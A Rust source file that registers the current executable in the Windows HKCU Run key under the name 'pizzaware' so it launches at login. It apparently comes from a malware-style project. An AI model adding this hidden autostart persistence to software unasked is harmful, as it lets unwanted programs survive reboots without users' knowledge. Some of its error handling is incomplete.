use std::env;
use windows::{
    core::{PCWSTR, w},
    Win32::System::Registry::{RegOpenKeyExW, RegSetValueExW, RegCloseKey, HKEY, HKEY_CURRENT_USER, KEY_SET_VALUE, REG_SZ},
};

pub fn add_startup_windows_registry() {
    /* Get the path to the current executable */
    let exe_path = env::current_exe().unwrap_or_else(|e| {
        panic!("Error: failed to get path to current exe: {e}")
    });
    let exe_path_str = exe_path.to_string_lossy().to_string();
    
    /* the name that will be entered into the registry */
    let app_name = "pizzaware";
    
    let mut key_handle = HKEY::default();
    let run_key_path = w!("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
    
    unsafe {
        /* Open Registry Key */
        let result = RegOpenKeyExW(
            HKEY_CURRENT_USER,
            run_key_path,
            Some(0),
            KEY_SET_VALUE,
            &mut key_handle,
        );
        
        /* Convert strings to required format */
        let app_name_wide: Vec<u16> = app_name.encode_utf16().chain(std::iter::once(0)).collect();
        let exe_path_wide: Vec<u16> = exe_path_str.encode_utf16().chain(std::iter::once(0)).collect();
        let exe_path_byte_slice = unsafe {
            std::slice::from_raw_parts(
                exe_path_wide.as_ptr() as *const u8,
                exe_path_wide.len() * std::mem::size_of::<u16>()
            )
        };

        /* Set the registry value */
        let result = RegSetValueExW(
            key_handle,
            PCWSTR::from_raw(app_name_wide.as_ptr()),
            Some(0),
            REG_SZ,
            Some(exe_path_byte_slice)
        );
        
        RegCloseKey(key_handle);
    }
    
    println!("Successfully added {} to startup registry.", app_name);
    println!("Path: {}", exe_path_str);
    
    // Uncomment this block to remove the registry key
    /*
    unsafe {
        // Open the key again
        let result = RegOpenKeyExW(
            HKEY_CURRENT_USER,
            run_key_path,
            0,
            KEY_SET_VALUE,
            &mut key_handle,
        );
        
        if result == ERROR_SUCCESS {
            let app_name_wide: Vec<u16> = app_name.encode_utf16().chain(std::iter::once(0)).collect();
            
            // Delete the value
            RegDeleteValueW(
                key_handle,
                PCWSTR::from_raw(app_name_wide.as_ptr()),
            );
            
            RegCloseKey(key_handle);
            println!("Removed {} from startup registry.", app_name);
        }
    }
    */
}